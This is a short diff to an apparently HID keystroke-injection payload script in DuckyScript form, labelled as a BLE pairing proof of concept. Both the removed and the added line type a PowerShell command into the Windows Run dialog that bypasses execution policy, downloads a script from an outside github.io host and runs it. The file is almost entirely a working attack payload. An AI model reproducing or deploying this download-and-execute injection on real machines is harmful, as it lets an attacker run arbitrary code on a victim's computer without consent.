@@ -2,5 +2,5 @@
 # {MAC} = this board's BLE address, substituted at runtime.
 GUI r
 DELAY 800
-STRING powershell -NoExit -ExecutionPolicy Bypass -Command "& ([scriptblock]::Create((iwr -useb https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1).Content)) -MAC '{MAC}'"
+STRING powershell -NoExit -ExecutionPolicy Bypass -Command "& ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1'))) -MAC '{MAC}'"
 ENTER
